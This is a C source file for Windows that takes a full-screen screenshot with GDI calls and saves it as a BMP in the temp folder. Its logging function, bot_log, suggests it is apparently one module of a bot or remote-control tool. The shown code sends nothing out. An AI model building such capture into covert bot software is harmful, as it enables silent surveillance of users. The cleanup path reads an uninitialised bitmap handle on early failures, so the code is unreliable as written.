#include "header.h"
// 保存 BMP 文件
int save_bitmap(HBITMAP hBitmap, const char* filePath) {
    BITMAP bmp;
    if (!GetObject(hBitmap, sizeof(BITMAP), &bmp)) {
        bot_log("[!] GetObject failed\n");
        return -1;
    }

    BITMAPFILEHEADER bfh = { 0 };
    BITMAPINFOHEADER bih = { 0 };

    // 设置文件头
    bfh.bfType = 0x4D42;  // "BM"
    DWORD size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmp.bmWidthBytes * bmp.bmHeight;
    bfh.bfSize = size;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // 设置信息头
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = bmp.bmWidth;
    bih.biHeight = -bmp.bmHeight;  // 正序
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;

    FILE* fp = fopen(filePath, "wb");
    if (!fp) {
        bot_log("[!] Failed to open file: %s\n", filePath);
        return -1;
    }

    fwrite(&bfh, sizeof(BITMAPFILEHEADER), 1, fp);
    fwrite(&bih, sizeof(BITMAPINFOHEADER), 1, fp);

    size_t bufferSize = (size_t)abs(bih.biWidth) * (size_t)abs(bih.biHeight) * 3;
    BYTE* pBits = (BYTE*)malloc(bufferSize);
    if (!pBits) {
        bot_log("[!] Failed to allocate memory for pixel data\n");
        fclose(fp);
        return -1;
    }

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = bmp.bmWidth;
    bmi.bmiHeader.biHeight = -bmp.bmHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    HDC hdc = CreateCompatibleDC(NULL);
    if (!hdc) {
        bot_log("[!] CreateCompatibleDC failed\n");
        free(pBits);
        fclose(fp);
        return -1;
    }

    int result = GetDIBits(hdc, hBitmap, 0, bmp.bmHeight, pBits, &bmi, DIB_RGB_COLORS);
    if (result == 0) {
        bot_log("[!] GetDIBits failed: %d\n", GetLastError());
        free(pBits);
        DeleteDC(hdc);
        fclose(fp);
        return -1;
    }

    size_t written = fwrite(pBits, 1, bufferSize, fp);
    if (written != bufferSize) {
        bot_log("[!] fwrite failed: wrote %zu of %zu bytes\n", written, bufferSize);
        free(pBits);
        DeleteDC(hdc);
        fclose(fp);
        return -1;
    }

    free(pBits);
    DeleteDC(hdc);
    fclose(fp);
    return 0;
}

// 截图函数（保存为 BMP）
int take_screenshot(char* out_path, int path_len) {
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        bot_log("[!] Failed to get screen DC\n");
        return -1;
    }

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        bot_log("[!] Failed to create memory DC\n");
        goto fail;
    }

    int width = GetDeviceCaps(hdcScreen, HORZRES);
    int height = GetDeviceCaps(hdcScreen, VERTRES);
    if (width <= 0 || height <= 0) {
        bot_log("[!] Invalid screen size: %d x %d\n", width, height);
        goto fail;
    }

    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
    if (!hbm) {
        bot_log("[!] Failed to create compatible bitmap\n");
        goto fail;
    }

    SelectObject(hdcMem, hbm);
    if (!BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY)) {
        bot_log("[!] BitBlt failed\n");
        goto fail;
    }

    // 使用 GetTempFileName 创建唯一的临时文件
    wchar_t tempPathW[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPathW) == 0) {
        bot_log("[!] Failed to get temp path\n");
        goto fail;
    }

    wchar_t tempFileW[MAX_PATH];
    UINT uUnique = GetTempFileNameW(tempPathW, L"scr", 0, tempFileW);
    if (uUnique == 0) {
        bot_log("[!] Failed to generate temp file name\n");
        goto fail;
    }

    char tempFileA[MAX_PATH];
    UnicodeToAnsi(tempFileW, tempFileA, MAX_PATH);

    // 保存为 BMP 文件
    if (save_bitmap(hbm, tempFileA) != 0) {
        bot_log("[!] Failed to save bitmap\n");
        goto fail;
    }

    strncpy(out_path, tempFileA, path_len);
    bot_log("[+] Screenshot saved: %s\n", out_path);

    // 清理资源
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    return 0;

fail:
    if (hbm) DeleteObject(hbm);
    if (hdcMem) DeleteDC(hdcMem);
    if (hdcScreen) ReleaseDC(NULL, hdcScreen);
    return -1;
}